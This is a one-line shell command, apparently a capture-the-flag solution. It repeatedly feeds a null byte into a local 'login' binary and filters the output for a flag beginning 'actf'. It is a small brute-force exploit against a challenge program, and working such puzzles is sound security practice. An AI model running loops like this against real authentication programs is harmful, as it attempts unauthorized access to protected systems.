bash -c 'while :; do python2 -c "print \"\x00\"" | ./login; done' | grep actf
